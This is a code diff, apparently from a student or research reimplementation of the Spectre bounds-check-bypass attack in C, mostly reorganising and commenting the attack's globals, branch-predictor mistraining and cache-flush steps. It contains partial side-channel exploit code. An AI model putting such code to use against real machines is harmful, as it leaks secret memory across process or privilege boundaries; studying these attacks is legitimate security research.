@@ -60,6 +60,25 @@ const char *readimage()
     fclose(fp);
     return (buffer);
 }
+
+
+/*
+ATTACKING CODE
+*/
+
+// GLOBAL PARAMETERS
+#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */ //As set in the Research Paper.
+bool attack[100];                //Boolean array to hold each try results, If TRUE then attack ELSE misstrain again.
+int results[256];                //Holds the results for each character.
+int char_patern[256];            //Random ASCII Char.
+int train_loops = 100;          //No of tries.
+
+
+/* 
+int fetch_victim(): Used to mistrained or when ready attack the processor by making it falsely return an index bigger than arr1_size. When our processor is speculatively executing at some point 
+it will skip the if stament and return out of range indices. By taking advantage of this we request the information desired to be loaded on the CPU cache and then retrieve it using side-channel
+attacks. 
+*/
 int fetch_victim(size_t index)
 {
     if (index < arr1_size)
@@ -72,19 +91,8 @@ int fetch_victim(size_t index)
     }
 }
 
-/*
-ATTACKING CODE
-*/
-
-// GLOBAL PARAMETERS
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
-bool attack[100];                //If TRUE then attack ELSE misstrain again.
-int results[256];                //Holds the results for each character.
-int char_patern[256];            //Random ASCII Char.
-int train_loops = 100;
-
 // Phase 1 - Misstrain processor by feeding processes. (e.g. Manipulating the cache state to remove data that the processor will need to determine the actual control flow.)
-//         - Prepare for side-channel attack.(e.g. perform flush or evict part of a Flush+Reload or Evict-Reload attack.)
+//         - Prepare for side-channel attack. In our case init arrays to hold the timing attack results(e.g. perform flush or evict part of a Flush+Reload or Evict-Reload attack.)
 
 void misstrain_proc(size_t target_idx, int tries)
 {
@@ -98,7 +106,7 @@ void misstrain_proc(size_t target_idx, int tries)
 
     // Training idx is the correct idx that is within arr1_size, which will train the branch predictor that brach is mostly taken
     train_idx = tries % arr1_size;
-
+    //Repeat 100 times the misstrain and attack
     for (i = 100 - 1; i >= 0; i--)
     {
         _mm_clflush(&arr1_size);
